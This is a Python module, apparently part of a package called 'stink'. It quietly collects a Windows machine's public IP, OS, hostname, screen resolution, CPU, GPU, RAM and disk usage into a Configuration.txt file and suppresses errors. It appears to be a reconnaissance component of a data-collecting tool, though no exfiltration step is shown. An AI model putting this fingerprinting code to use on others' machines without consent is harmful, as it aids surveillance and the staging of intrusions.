import platform
from os import mkdir, path
from string import ascii_uppercase
from urllib.request import Request, urlopen
from ctypes import windll, sizeof, byref, c_wchar_p
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE

from stink.helpers import functions
from stink.helpers.config import SystemConfig
from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger


class System:

    def __init__(self, storage_path: str, folder: str, errors: bool):

        self.config = SystemConfig()
        self.storage_path = storage_path
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        storage_path = rf"{self.storage_path}\{self.folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    @staticmethod
    def __get_video_card():

        try:

            display_device = DisplayDevice()
            display_device.cb = sizeof(DisplayDevice)

            user32 = windll.user32
            result = user32.EnumDisplayDevicesW(None, 0, byref(display_device), 0)

            if not result:
                return None

            return display_device.DeviceString.strip()

        except:
            return "Unknown"

    @staticmethod
    def __get_ram():

        try:

            memory_status = MemoryStatusEx()
            memory_status.dwLength = sizeof(memory_status)

            kernel32 = windll.kernel32

            kernel32.GlobalMemoryStatusEx(byref(memory_status))

            total = str(round(memory_status.ullTotalPhys / (1024 ** 3), 2))
            used = str(round((memory_status.ullTotalPhys - memory_status.ullAvailPhys) / (1024 ** 3), 2))
            free = str(round(memory_status.ullAvailPhys / (1024 ** 3), 2))

            return "\n".join(line for line in functions.create_table(["Used GB", "Free GB", "Total GB"], [[used, free, total]]))

        except:
            return "Unknown"

    @staticmethod
    def __get_disks_info():

        try:

            kernel32 = windll.kernel32

            drives = []
            bitmask = kernel32.GetLogicalDrives()

            for letter in ascii_uppercase:
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1

            result = []

            for drive in drives:

                total_bytes = UlargeInteger()
                free_bytes = UlargeInteger()
                available_bytes = UlargeInteger()
                success = kernel32.GetDiskFreeSpaceExW(c_wchar_p(drive), byref(available_bytes), byref(total_bytes), byref(free_bytes))

                if not success:
                    continue

                total = ((total_bytes.HighPart * (2 ** 32)) + total_bytes.LowPart) / (1024 ** 3)
                free = ((free_bytes.HighPart * (2 ** 32)) + free_bytes.LowPart) / (1024 ** 3)
                used = total - free

                result.append([drive, round(used, 2), round(free, 2), round(total, 2)])

            return "\n".join(line for line in functions.create_table(["Drive", "Used GB", "Free GB", "Total GB"], result))

        except:
            return "Unknown"

    @staticmethod
    def __get_processor_name():

        try:
            return QueryValueEx(OpenKey(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"), "ProcessorNameString")[0]
        except:
            return "Unknown"

    def __get_ip(self):

        try:
            return urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
        except:
            return "Unknown"

    def __get_system_info(self):

        user32 = windll.user32
        data = self.config.SystemData

        net_info = self.__get_ip()
        machine_type = platform.machine()
        os_info = platform.platform()
        network_name = platform.node()
        cpu_info = self.__get_processor_name()
        gpu_info = self.__get_video_card()
        ram_info = self.__get_ram()
        disk_info = self.__get_disks_info()
        monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"

        with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:

            system.write(data.format(
                self.config.User,
                net_info,
                machine_type,
                os_info,
                network_name,
                monitors_info,
                cpu_info,
                gpu_info,
                ram_info,
                disk_info
            ))

    def run(self):

        try:

            self.__create_folder()
            self.__get_system_info()

        except Exception as e:
            if self.errors is True: print(f"[System]: {repr(e)}")
